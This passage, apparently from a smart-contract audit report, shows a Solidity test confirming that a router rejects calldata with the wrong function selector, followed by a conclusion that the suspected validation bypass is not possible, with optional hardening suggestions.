        router.exposedValidateRouterCall(data);
    }

    function testRejectsWrongSelector() public {
        // Use a random selector that is not aggregate3Value
        bytes4 badSelector = 0x12345678;
        bytes memory payload = abi.encode(IMulticall3.Call3Value({
            target: address(this),
            allowFailure: false,
            value: 0,
            callData: ""
        }));
        bytes memory data = abi.encodePacked(badSelector, payload);

        vm.expectRevert(TrailsRouter.InvalidFunctionSelector.selector);
        router.exposedValidateRouterCall(data);
    }
}


## Suggested Mitigation
No changes are required for this specific pattern. `_validateRouterCall` correctly restricts router usage to `aggregate3Value` and enforces `allowFailure == false` for every element in the `Call3Value[]` array using canonical ABI decoding. The hypothesized bypass is not possible. If additional hardening is desired (independent of this non-issue), the router could optionally: (a) bound the maximum number of aggregated calls, and/or (b) restrict or vet target addresses for specific deployments. These would be defense-in-depth measures rather than fixes for a vulnerability.



